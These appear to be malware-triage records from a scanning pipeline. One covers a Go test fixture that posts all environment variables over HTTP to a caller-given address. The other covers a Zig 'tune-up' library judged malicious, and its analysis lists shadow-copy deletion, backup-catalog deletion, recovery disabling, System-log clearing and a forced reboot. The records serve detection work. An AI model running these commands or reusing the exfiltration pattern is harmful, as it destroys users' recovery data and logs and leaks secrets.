samples.marker_line: Go regression fixture: no entrypoint or caller; keep env-export traits
samples.identification: Repository Go environment-export regression control, package stealer
trace: No main, init, global initializer, exported function or call site exists in the supplied file.

The unexported exfiltrate(c2 string) function calls os.Environ(), joins all key=value entries with newlines, constructs url.Values{env:{env}}, and calls http.PostForm(c2, ...). Response and error are discarded.
The URL is an unbound caller parameter; no endpoint is supplied. There is no obfuscation, persistence, payload acquisition, shell execution, privilege change or cleanup.
samples.judgment_reason: Exact SHA-256 identity with testdata/hostile/go-env-http-exfil-live.go and its explicit detection-regression purpose tip the artifact judgment to BENIGN. The supplied code has no activation path or configured recipient. The function still demonstrates an environment-to-HTTP-body attack pattern, so its accurate hostile and suspicious detections remain. A larger same-package caller or deployment invoking this function is not supplied.
samples.finding_review: All 1 hostile and 1 suspicious findings were traced. Whole-environment export is implemented if the function is called; the generic flow candidates do not establish actual secret values, reachability or runtime success. No severity is lowered and no test-comment/name exclusion is added.
samples.classifier_comparison: BENIGN[38%] before and after; agrees with the contextual fixture verdict. Raw probability remains 0.97191674. Retained hostile technique evidence is intentional and independent of the artifact verdict.

samples.marker_line: indigocraft 0.3.10: recovery sabotage, log clear, forced reboot
samples.identification: indigocraft 0.3.10 Zig recovery-sabotage library, including macOS arm64 cached build artifacts
trace: build.zig creates a static library and a test runner; its only supplied unit test checks steps.len == 5. Neither build() nor the test invokes runTuneup(). Cached build.build disassembly calls standard target/optimization configuration, addModule, addLibrary, installArtifact, addTest, addRunArtifact, step and dependOn, then returns.
Calling public runTuneup() returns 0 unless std.posix.getenv of the opaque activation key is non-null. Only presence is checked, including an empty value. No sandbox-specific probe exists.

It iterates the five literal commands in order, formats cmd.exe /c {s} into a fixed buffer, and initializes a child using /bin/sh -c cmdline. The three child streams are set to Ignore. spawnAndWait errors and termination statuses are discarded; done increments even on process failure.

Effects attempted: vssadmin delete shadows /all /quiet; wbadmin DELETE CATALOG -quiet; bcdedit /set {default} recoveryenabled No; wevtutil cl System; shutdown /r /t 7 /f. These destroy recovery resources, disable recovery, erase one event log and force a delayed restart.

The launch requires /bin/sh and a discoverable cmd.exe plus adequate rights. A native Windows-only context is not sufficient for this POSIX launch path; the code has no elevation mechanism. Actual execution, permission and command success are unestablished.

The arm64 Mach-O library object contains only builtin link/output-mode data and no runTuneup symbol or compiled payload. Duplicate .a copies contain the same object. The source remains the malicious implementation a consumer can compile and call.

Decoded native-text candidates are short binary/gibberish strings from encoding heuristics; there is no demonstrated hidden script or second executable stage. Standard Zig build-runner capabilities and neutral metadata are preserved.
samples.judgment_reason: Fixed coordinated recovery destruction, System-log clearing and forced reboot contradict the disk-cleanup/tune-up description. The README also calls the helpers recovery-destroy. A deliberately gated callable library still implements sabotage even though this package does not invoke it automatically. No authorized fleet-maintenance deployment or consumer is supplied. These observations support MALICIOUS independently of registry provenance and scores.
samples.finding_review: All 3 hostile and 6 suspicious findings are supported by the command array and traced loop. The hostile objectives distinguish recovery inhibition, log erasure accompanying sabotage, and disruptive forced restart. Primitive deletion/disablement traits retain suspicious severity because their standalone commands can have administrative uses.
samples.coverage_goal: Three distinct hostile effects are covered. The newly added environment read and stream suppression fill primitive gaps; neither is promoted to hostile. There is no evidence for additional theft, persistence, ransomware encryption or escalation.
samples.classifier_comparison: Archive HOSTILE[100%] before and after. Direct source classifier remains BENIGN[54%] before and after despite 3 hostile and 6 suspicious source findings; this is a model miss. All other scored archive members remain benign; only the compiler object probability materially decreases when its two false clues are corrected.
